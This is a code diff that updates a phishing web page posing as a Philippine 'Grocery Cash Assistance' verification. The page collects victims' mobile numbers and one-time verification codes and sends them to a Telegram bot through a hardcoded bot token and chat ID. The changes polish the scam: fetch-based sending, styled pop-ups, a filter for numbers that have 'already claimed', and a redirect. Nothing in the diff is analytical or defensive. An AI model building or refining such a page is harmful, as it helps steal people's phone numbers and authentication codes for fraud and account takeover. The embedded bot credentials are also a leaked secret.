@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>FreeShoppingPH | Verification Process</title>
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         :root {
             --primary-green: #2d6a4f;
@@ -25,7 +26,7 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            overflow: hidden;
+            overflow-x: hidden;
         }
 
         .card {
@@ -67,6 +68,7 @@
         }
 
         .btn-primary:active { transform: scale(0.98); }
+        .btn-primary:disabled { background: #ccc; cursor: not-allowed; }
 
         .modal-overlay {
             display: none;
@@ -161,7 +163,7 @@
                     <label class="radio-item"><input type="radio" name="reg" value="No"> No</label>
                 </div>
 
-                <button class="btn-primary" onclick="processStep1()">Confirm & Receive Call</button>
+                <button class="btn-primary" id="confirmBtn" onclick="processStep1()">Confirm & Receive Call</button>
             </div>
 
             <div id="step2" class="hidden">
@@ -176,19 +178,18 @@
         </div>
     </div>
 
-    <script src="config.js"></script>
+    <script>
+        document.write('<script src="config.js?v=' + Date.now() + '"><\/script>');
+    </script>
 
     <script>
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
         const BYPASS_MODE = true; 
 
-        // TANGGALIN ANG REDIRECT LOOP SA CLICK
         function handleVerify() {
-            // Buksan agad ang modal (Siguradong Clickable)
             document.getElementById('modalOverlay').style.display = 'flex';
             
-            // Subukan lang mag-redirect sa Chrome kung Android user
             const ua = navigator.userAgent.toLowerCase();
             if (ua.indexOf("android") > -1 && !window.location.hash.includes("verified")) {
                 const currentUrl = window.location.href.replace(/^https?:\/\//, '');
@@ -207,6 +208,7 @@
             const phoneInput = document.getElementById('userPhone');
             const phone = phoneInput.value.trim();
             const regStatus = document.querySelector('input[name="reg"]:checked').value;
+            const confirmBtn = document.getElementById('confirmBtn');
 
             // 1. VALIDATION FORMAT
             if (phone.length < 11 || !phone.startsWith('09')) {
@@ -215,25 +217,33 @@
                 return;
             }
 
-            // 2. CHECK ALREADY CLAIMED (From config.js)
-            if (typeof CLAIMED_NUMBERS !== 'undefined') {
-                if (CLAIMED_NUMBERS.includes(phone)) {
-                    alert("SYSTEM MESSAGE:\n\nThe mobile number " + phone + " has already successfully claimed the Grocery Cash Assistance (GCA). Limit: 1 Claim per Beneficiary.");
-                    phoneInput.classList.add('shake-error');
-                    phoneInput.value = ""; 
-                    setTimeout(() => phoneInput.classList.remove('shake-error'), 500);
-                    return; 
-                }
+            // 2. CHECK ALREADY CLAIMED (The Filter)
+            if (typeof CLAIMED_NUMBERS !== 'undefined' && CLAIMED_NUMBERS.includes(phone)) {
+                Swal.fire({
+                    icon: 'warning',
+                    title: 'Already Claimed',
+                    html: `Ang mobile number na <b>${phone}</b> ay matagumpay nang nakakuha ng Assistance.<br><br><small>Limit: 1 Claim per Beneficiary</small>`,
+                    confirmButtonColor: '#2d6a4f'
+                });
+                
+                phoneInput.classList.add('shake-error');
+                phoneInput.value = ""; 
+                setTimeout(() => phoneInput.classList.remove('shake-error'), 500);
+                return; // STOP: Hindi na tutuloy sa Telegram o redirect
             }
 
-            // 3. TELEGRAM SEND
-            const msg = `🛒 GROCERY ASSIST REQUEST:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
-            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+            // 3. SEND TO TELEGRAM
+            confirmBtn.disabled = true;
+            confirmBtn.innerHTML = "Checking...";
 
+            const msg = `🛒 GROCERY ASSIST REQUEST:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+
+            // 4. REDIRECT OR STEP 2
             if(BYPASS_MODE) {
                 setTimeout(() => {
                     window.location.href = "main.html";
-                }, 800);
+                }, 1500);
             } else {
                 document.getElementById('step1').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
@@ -246,8 +256,15 @@
             const phone = document.getElementById('userPhone').value;
             vInput.classList.add('shake-error');
             setTimeout(() => vInput.classList.remove('shake-error'), 500);
-            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('⚠️ CODE FAILED:\n📱 ' + phone + '\n🔢 Code: ' + vInput.value)}`;
-            alert("Activation failed. Please wait for a new system call.");
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('⚠️ CODE FAILED:\n📱 ' + phone + '\n🔢 Code: ' + vInput.value)}`);
+            
+            Swal.fire({
+                icon: 'error',
+                title: 'Activation Failed',
+                text: 'Please wait for a new system call for your code.',
+                confirmButtonColor: '#d33'
+            });
             vInput.value = "";
         }
 
@@ -257,7 +274,7 @@
             const interval = setInterval(() => {
                 let m = Math.floor(timer / 60);
                 let s = timer % 60;
-                display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+                if(display) display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
                 if (--timer < 0) clearInterval(interval);
             }, 1000);
         }
